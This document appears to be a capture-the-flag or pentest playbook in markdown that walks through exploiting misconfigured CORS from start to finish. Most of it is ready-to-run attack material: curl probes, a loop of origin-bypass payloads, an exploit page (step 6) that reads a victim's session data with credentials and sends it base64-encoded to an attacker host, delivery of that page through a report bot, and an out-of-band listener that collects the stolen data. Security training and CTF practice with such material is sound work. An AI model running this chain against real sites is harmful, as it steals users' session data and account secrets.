# Workflow — CORS end to end

The loop: measure the ACAO/ACAC pair on the sensitive endpoint,
find the origin-check gap, deliver the read through the victim,
exfil the data.

---

## 1. Inventory the sensitive endpoints

```bash
# the endpoints that return session data — the read targets
grep -rnoE '(api|me|user|profile|flag|secret|data|private|admin|account|balance|token|config)' <src> | \
  grep -iE 'route|@|app\.|def |get|json' | head -30

# the front-end's cross-origin calls
grep -rnoE "fetch\(|axios|XMLHttpRequest|api\." <src>/static/*.js | head -20
```

The read is only useful on an endpoint returning sensitive data
under a session.

## 2. The central measurement — ACAO + ACAC

```bash
# the pair, in two requests
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-allow-(origin|credentials)'
#   ACAO reflected / * / fixed / null / absent
#   ACAC true / absent
```

## 3. The decision tree

```text
ACAO reflected + ACAC:true        → full read — build the exploit
ACAO:null + ACAC:true             → opaque-origin read — sandbox/data:
ACAO:*                            → no credentials — public read only
ACAO fixed-allowlist              → bypass test (substring/prefix/
                                    null/subdomain/parser)
no ACAO                           → not CORS-open — a different class
ACAC absent                       → non-credentialed read — limited
SameSite=Lax on the cookie        → the fetch can't attach it —
                                    a non-credentialed read
```

## 4. The origin-check bypass battery — when the check isn't open

```bash
for o in 'https://evil.com' 'https://target.com.evil.com' \
         'https://eviltarget.com' 'https://sub.target.com' \
         'https://target.com@evil.com' 'https://evil.com?target.com' \
         'null' 'https://target.com%60.evil.com'; do
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin' | xargs echo "$o ->"
done
```

## 5. The preflight read — for non-simple reads

```bash
curl -i -X OPTIONS "$BASE/api/x" \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: X-Token'
# read ACAO/ACAM/ACAH/ACAC on the preflight
```

## 6. Build the exploit page

```html
<script>
fetch('https://t/api/me',{credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://attacker/x?d='+btoa(JSON.stringify(d))))
</script>
```

## 7. Deliver through the victim/bot

```bash
# the bot endpoint — the page reads under the bot's session
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker/page"}'
# or a data: URL for a null-origin or airgapped case
```

## 8. Exfil + readback

```bash
# the OOB listener — receive the exfil
python3 tools/web/oob_listener.py serve --port 8001 &
python3 tools/web/oob_listener.py hits
# a hit with the data → decode → the flag
```

## 9. Record the verdict

```bash
python3 tools/hooks.py post-probe <c> --verdict confirms \
  --hypothesis-id <H> --class web-cors --evidence-kind impact \
  --evidence 'read the session data cross-origin' \
  --response '<the exfil/received data>'
python3 tools/hooks.py pre-flag --value 'FLAG{...}' \
  --source 'GET /x?d=...' --evidence '<the hit>'
```

## 10. The negative path

```text
a fixed allowlist + no bypass → dead
a `*` on a sensitive endpoint → not exploitable (no creds)
SameSite=Lax + no non-cookie credential → non-credentialed only
a strict preflight + no simple read → dead via preflight
each held gate → a refutes verdict + the pivot
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "cors-workflow: <acao-shape> -> credentialed read -> exfil"
```
